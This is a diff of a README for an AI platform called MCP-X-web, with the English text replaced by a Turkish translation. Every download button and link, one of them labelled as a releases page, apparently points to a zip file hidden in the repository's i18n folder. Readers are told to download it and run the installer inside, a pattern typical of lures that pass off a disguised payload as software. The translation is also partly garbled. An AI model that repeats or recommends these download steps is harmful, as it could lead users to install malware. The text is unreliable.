@@ -1,150 +1,171 @@
-# 🤖 MCP-X-web - Simplify Enterprise AI Creation
+# 🤖 MCP-X-web - Kurumsal Yapay Zeka Oluşturmayı Basitleştirin
 
-[![Download MCP-X-web](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
-
----
-
-## 💡 What is MCP-X-web?
-
-MCP-X-web is a tool built for business teams and developers who want to work with AI. It brings together several AI features in one place. You can chat with AI, create videos, edit pictures, and build simple web apps without writing code.
-
-This platform offers many tools that help you use AI in your work. It makes complex AI tasks easier and faster. Whether you want to make smarter conversations or create content, MCP-X-web helps you get started quickly.
+[![MCP-X-web'i İndirin](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
 
 ---
 
-## 🎯 Key Features
+## 💡 MCP-X-web Nedir?
 
-- **AI Chatbots**  
-  Talk to AI models that understand and respond to your questions clearly and naturally.
+MCP-X-web, yapay zeka ile çalışmak isteyen iş ekipleri ve geliştiriciler için oluşturulmuş bir araçtır. Birçok yapay zeka özelliğini tek bir yerde bir araya getirir. Yapay zeka ile sohbet edebilir, videolar oluşturabilir, resimleri düzenleyebilir ve kod yazmadan basit web uygulamaları oluşturabilirsiniz.
 
-- **Video Generation**  
-  Create videos from text or images using AI tools.
-
-- **Image Editing**  
-  Use smart filters and editing tools to improve or change pictures easily.
-
-- **Web App Builder**  
-  Build simple front-end apps to showcase AI capabilities or create user interfaces without coding.
-
-- **One-Stop AI Workflow**  
-  Access different AI creation tools in a single place to save time and reduce learning curves.
+Bu platform, işinizde yapay zekayı kullanmanıza yardımcı olan birçok araç sunar. Karmaşık yapay zeka görevlerini daha kolay ve hızlı hale getirir. İster daha akıllı sohbetler yapmak, ister içerik oluşturmak isteyin, MCP-X-web hızlı bir şekilde başlamanıza yardımcı olur.
 
 ---
 
-## 🖥️ System Requirements
+## 🎯 Temel Özellikler
 
-To run MCP-X-web smoothly, your computer should meet the following:
+- **Yapay Zeka Sohbet Botları**
+Sorularınızı net ve doğal bir şekilde anlayan ve yanıtlayan yapay zeka modelleriyle konuşun.
 
-- Operating System: Windows 10 or later, macOS Catalina or later, or Linux (Ubuntu 18.04+)
-- Processor: Intel Core i3 or equivalent AMD processor, minimum 2.0 GHz 
-- Memory: At least 4 GB RAM
-- Storage: At least 2 GB free space for installation and temporary files
-- Internet: Required to access AI services and download updates
-- Browser: Modern web browser (Chrome, Firefox, Edge, Safari) if using in web mode
+- **Video Oluşturma**
+Yapay zeka araçlarını kullanarak metin veya resimlerden videolar oluşturun.
 
----
+- **Resim Düzenleme**
+Resimleri kolayca iyileştirmek veya değiştirmek için akıllı filtreler ve düzenleme araçları kullanın.
 
-## 🚀 Getting Started
+- **Web Uygulama Oluşturucu**
+Yapay zeka yeteneklerini sergilemek veya kodlama yapmadan kullanıcı arayüzleri oluşturmak için basit ön uç uygulamaları oluşturun.
 
-Follow these simple steps to begin using MCP-X-web:
-
-1. **Download the Software**  
-   Click the big button at the top or visit the [MCP-X-web Releases page](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip) to get the latest version.
-
-2. **Install on Your Computer**  
-   After downloading, double-click the installer file and follow the instructions. The setup wizard will guide you through the process.
-
-3. **Launch MCP-X-web**  
-   Open the application from your desktop or start menu once installation finishes.
-
-4. **Create an Account**  
-   You may need to sign up or log in to access some features. Use a valid email address and choose a secure password.
-
-5. **Explore AI Tools**  
-   Navigate the interface to try chatbots, video creation, or image editing. The platform offers simple guides for each tool.
+- **Tek Duraklı Yapay Zeka İş Akışı**
+Zaman kazanmak ve öğrenme eğrilerini azaltmak için farklı yapay zeka oluşturma araçlarına tek bir yerden erişin.
 
 ---
 
-## ⬇️ Download & Install
+## 🖥️ Sistem Gereksinimleri
 
-To get MCP-X-web, visit this page:
+MCP-X-web'i sorunsuz çalıştırmak için bilgisayarınızın aşağıdaki gereksinimleri karşılaması gerekir:
 
-[Download MCP-X-web on GitHub](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
-
-Here is how to proceed after opening the page:
-
-- Find the latest release at the top. It will list files for different systems.
-- Choose the right file for your computer (look for `.exe` on Windows, `.dmg` on macOS, or `.AppImage`/`.deb` for Linux).
-- Click the file link to download.
-- Once downloaded, open the file to start installation.
-- Follow on-screen prompts. The installer will place the software in your programs folder.
+- İşletim Sistemi: Windows 10 veya üzeri, macOS Catalina veya üzeri veya Linux (Ubuntu 18.04+)
+- İşlemci: Intel Core i3 veya eşdeğer AMD işlemci, minimum 2.0 GHz
+- Bellek: En az 4 GB RAM
+- Depolama: Kurulum ve geçici dosyalar için en az 2 GB boş alan
+- İnternet: Yapay zeka hizmetlerine erişmek ve güncellemeleri indirmek için gereklidir
+- Tarayıcı: Web modunda kullanılıyorsa modern bir web tarayıcısı (Chrome, Firefox, Edge, Safari)
 
 ---
 
-## 📋 Basic Usage Tips
+## 🚀 Başlangıç
 
-- **Starting a Chat Session**  
-  Click the AI chat option and type a question or message. The AI will reply instantly.
+MCP-X-web'i kullanmaya başlamak için şu basit adımları izleyin:
 
-- **Creating a Video**  
-  Select the video tool. Input text or images, then hit ‘Generate.’ The AI will create a video based on your input.
+1. **Yazılımı İndirin**
 
-- **Editing Images**  
-  Upload a photo. Choose tools like crop, filter, or enhancement to improve the image with one click.
+Üstteki büyük düğmeye tıklayın veya [MCP-X-web Sürümleri] sayfasını ziyaret edin. 1. En son sürümü almak için [sayfa](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip) adresini ziyaret edin.
 
-- **Building a Web App**  
-  Use the front-end builder to drag and drop features. Preview your app in real time.
+2. **Bilgisayarınıza Kurun**
+İndirdikten sonra, yükleyici dosyasına çift tıklayın ve talimatları izleyin. Kurulum sihirbazı sizi süreç boyunca yönlendirecektir.
 
-- **Saving and Exporting**  
-  Save your projects regularly. Export final videos or images to common file formats like MP4 or JPEG.
+3. **MCP-X-web'i Başlatın**
+Kurulum tamamlandıktan sonra uygulamayı masaüstünüzden veya başlat menüsünden açın.
 
----
+4. **Hesap Oluşturun**
+Bazı özelliklere erişmek için kaydolmanız veya giriş yapmanız gerekebilir. Geçerli bir e-posta adresi kullanın ve güvenli bir parola seçin.
 
-## 🛠️ Troubleshooting
-
-If you encounter issues, try these steps:
-
-- Restart the application.
-- Check your internet connection.
-- Make sure your system meets the requirements above.
-- Update to the latest version from the release page.
-- Refer to the built-in help section for specific features.
-- Visit the Issues tab on the GitHub page to see if others have reported similar problems.
+5. **Yapay Zeka Araçlarını Keşfedin**
+Sohbet botlarını, video oluşturmayı veya görüntü düzenlemeyi denemek için arayüzde gezinin. Platform, her araç için basit kılavuzlar sunar.
 
 ---
 
-## 🔧 Advanced Options
+## ⬇️ İndirme ve Kurulum
 
-For users wanting more control:
+MCP-X-web'i edinmek için şu sayfayı ziyaret edin:
 
-- Connect MCP-X-web to external AI services via the settings menu.
-- Adjust video resolution and image quality in preferences.
-- Use keyboard shortcuts for faster navigation (listed in the help menu).
-- Export code snippets for custom web app integration.
+[GitHub'dan MCP-X-web'i İndirin](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
 
----
+Sayfayı açtıktan sonra şu adımları izleyin:
 
-## 📚 Learn More & Support
+- En üstte en son sürümü bulun. Farklı sistemler için dosyaları listeleyecektir.
 
-- Visit the official documentation linked on the GitHub README.
-- Follow community discussions on forums connected to this project.
-- Report bugs or request features in the GitHub Issues section.
-- Contact support via email or social media, if available.
+- Bilgisayarınız için doğru dosyayı seçin (Windows'ta `.exe`, macOS'ta `.dmg` veya Linux'ta `.AppImage`/`.deb` arayın).
 
----
+- İndirmek için dosya bağlantısına tıklayın.
 
-## 🔖 About This Project
+- İndirildikten sonra, kurulumu başlatmak için dosyayı açın.
 
-MCP-X-web combines AI dialogue, video, image editing, and app building into one platform. It aims to reduce the technical barrier for companies and developers exploring AI. The project supports tools related to agents, AI models like Claude and OpenAI, and other tech used in AI workflows.
-
-The repository covers development and maintenance for this all-in-one AI creation tool. Community input is welcome to improve features and fix problems.
+- Ekrandaki talimatları izleyin. Kurulum programı yazılımı programlar klasörünüze yerleştirecektir.
 
 ---
 
-## 🏷️ Topics
+## 📋 Temel Kullanım İpuçları
+
+- **Sohbet Oturumu Başlatma**
+
+Yapay zeka sohbet seçeneğine tıklayın ve bir soru veya mesaj yazın. Yapay zeka anında yanıt verecektir.
+
+- **Video Oluşturma**
+
+Video aracını seçin. Metin veya resim girin, ardından 'Oluştur' düğmesine basın. Yapay zeka, girdiğiniz bilgilere göre bir video oluşturacaktır.
+
+- **Resim Düzenleme**
+
+Bir fotoğraf yükleyin. Tek tıklamayla görüntüyü iyileştirmek için kırpma, filtre veya geliştirme gibi araçları seçin.
+
+- **Web Uygulaması Oluşturma**
+
+Ön uç oluşturucuyu kullanarak özellikleri sürükleyip bırakın. Uygulamanızı gerçek zamanlı olarak önizleyin.
+
+- **Kaydetme ve Dışa Aktarma**
+
+Projelerinizi düzenli olarak kaydedin. Son videoları veya resimleri MP4 veya JPEG gibi yaygın dosya biçimlerine dışa aktarın.
+
+---
+
+## 🛠️ Sorun Giderme
+
+Sorunlarla karşılaşırsanız, şu adımları deneyin:
+
+- Uygulamayı yeniden başlatın.
+
+- İnternet bağlantınızı kontrol edin.
+
+- Sisteminizin yukarıdaki gereksinimleri karşıladığından emin olun.
+
+- Sürüm sayfasından en son sürüme güncelleyin.
+
+- Belirli özellikler için yerleşik yardım bölümüne bakın.
+
+- Benzer sorunları başkalarının da bildirip bildirmediğini görmek için GitHub sayfasındaki Sorunlar sekmesini ziyaret edin.
+
+---
+
+## 🔧 Gelişmiş Seçenekler
+
+Daha fazla kontrol isteyen kullanıcılar için:
+
+- Ayarlar menüsü aracılığıyla MCP-X-web'i harici yapay zeka hizmetlerine bağlayın.
+
+- Tercihlerde video çözünürlüğünü ve görüntü kalitesini ayarlayın.
+
+- Daha hızlı gezinme için klavye kısayollarını kullanın (yardım menüsünde listelenmiştir).
+
+----
+
+## 📚 Daha Fazla Bilgi ve Destek
+
+- GitHub README dosyasında bağlantısı verilen resmi belgelere bakın.
+
+- Bu projeyle bağlantılı forumlardaki topluluk tartışmalarını takip edin.
+
+- GitHub Sorunları bölümünde hataları bildirin veya özellik talebinde bulunun.
+
+- Varsa, e-posta veya sosyal medya aracılığıyla destekle iletişime geçin.
+
+  Proje
+
+MCP-X-web, yapay zeka diyaloglarını, videoları, görüntü düzenlemeyi ve uygulama geliştirmeyi tek bir platformda birleştiriyor. Şirketler ve geliştiriciler için yapay zekayı keşfetmenin teknik engellerini azaltmayı amaçlıyor. Proje, ajanlarla, Claude ve OpenAI gibi yapay zeka modelleriyle ve yapay zeka iş akışlarında kullanılan diğer teknolojilerle ilgili araçları destekliyor.
+
+Bu depo, bu hepsi bir arada yapay zeka oluşturma aracının geliştirilmesi ve bakımını kapsıyor. Özellikleri iyileştirmek ve sorunları gidermek için topluluktan gelen katkılar memnuniyetle karşılanmaktadır.
+
+---
+
+## 🏷️ Konular
 
 agent, ai, claude, deepseek, dify, gemini, kimi, lovart, mcp, nanobanana, openai, qwen, seed, tapnow, veo
 
 ---
 
-[![Download MCP-X-web](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
+[![MCP-X-web'i İndir](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
+
+---
+
+## 🔖 Bu P Hakkında
